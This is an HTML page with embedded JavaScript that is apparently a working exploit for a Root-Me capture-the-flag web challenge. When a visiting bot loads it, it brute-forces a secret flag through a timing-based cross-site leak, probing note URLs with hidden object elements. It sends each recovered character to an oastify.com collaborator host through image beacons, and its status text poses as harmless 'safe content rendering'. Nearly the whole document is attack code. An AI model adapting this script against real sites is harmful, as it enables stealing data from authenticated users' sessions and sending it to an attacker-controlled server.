<!DOCTYPE html>
<html>
<head>
    <title>Automated Verification Exploit</title>
</head>
<body>
    <h1>Processing safe content rendering...</h1>
    <div id="status" style="font-family: sans-serif; color: blue;">Initializing session...</div>

    <script>
        const targetMain = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
        const exfilUrl   = "http://c6jebfw4342upnf3c2zfoga2zt5ktch1.oastify.com/?flag=";

        // ── TUNING ─────────────────────────────────────────────────────────────
        // Widen the hit window significantly — avoid missing chars at the edges.
        const HIT_MIN = 1500;   // was 2000 — capture slower-but-valid matches
        const HIT_MAX = 5000;   // was 3000 — allow for higher-latency hits

        // Flag prefix already confirmed by previous run.
        // The bot returned "fake" — start from there so we don't re-probe known chars.
        let currentFlag = "fake";

        // Full printable charset — the previous run missed chars after "fake"
        // because the alphabet was too narrow.
        const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_+!@#$%&*()-=[]{}|;:,.<>?";

        const targetBase = "https://web-client-ch56.challenge01.root-me.org:58056/notes/392/";

        // ── HELPERS ────────────────────────────────────────────────────────────
        const sleep = ms => new Promise(res => setTimeout(res, ms));

        /**
         * Use <object> instead of <img> — fires onload for ALL content-types
         * (HTML, JSON, text), not just images. More reliable timing signal.
         */
        function probeObject(url) {
            return new Promise(resolve => {
                const obj   = document.createElement("object");
                const start = performance.now();
                obj.onload  = obj.onerror = () => {
                    resolve(performance.now() - start);
                    obj.remove();
                };
                obj.data = url + "?_=" + Math.random(); // cache-bust
                obj.style.display = "none";
                document.body.appendChild(obj);
            });
        }

        /**
         * Adaptive baseline: measure 3 known-miss strings first,
         * then set threshold = baseline + 1200ms.
         * Adapts to the bot's current network conditions automatically.
         */
        async function calibrate() {
            const misses = [
                targetBase + "zz_no_match_1",
                targetBase + "zz_no_match_2",
                targetBase + "zz_no_match_3"
            ];
            let total = 0;
            for (const url of misses) {
                total += await probeObject(url);
                await sleep(200);
            }
            const baseline  = total / misses.length;
            const threshold = baseline + 1200;
            new Image().src = exfilUrl + "BASELINE_" + Math.round(baseline) + "ms_THRESHOLD_" + Math.round(threshold) + "ms";
            return threshold;
        }

        // ── MAIN ───────────────────────────────────────────────────────────────
        async function startExploit() {
            new Image().src = exfilUrl + "BOT_ARRIVED_OK";
            document.getElementById("status").innerText = "Connected. Calibrating...";

            // Open authenticated session
            window.open(targetMain, "auth_win");
            await sleep(2000);

            // Measure adaptive threshold
            const threshold = await calibrate();
            document.getElementById("status").innerText = "Calibrated. Brute-forcing...";

            let cracking = true;
            while (cracking) {
                let foundChar = false;

                for (const char of alphabet) {
                    const candidate = currentFlag + char;
                    const url       = targetBase + encodeURIComponent(candidate);

                    const t = await probeObject(url);
                    document.getElementById("status").innerText = `Trying: "${candidate}" → ${Math.round(t)}ms (threshold: ${Math.round(threshold)}ms)`;

                    // Hit if above adaptive threshold AND below a hard cap (rules out timeouts)
                    if (t > threshold && t < 6000) {
                        currentFlag = candidate;
                        foundChar   = true;
                        new Image().src = exfilUrl + "PROGRESS_" + encodeURIComponent(currentFlag);
                        await sleep(500);
                        break;
                    }
                    await sleep(200);
                }

                if (!foundChar) {
                    new Image().src = exfilUrl + "COMPLETE_" + encodeURIComponent(currentFlag);
                    cracking = false;
                    document.getElementById("status").innerText = "Done: " + currentFlag;
                }
            }
        }

        window.onload = () => setTimeout(startExploit, 500);
    </script>
</body>
</html>
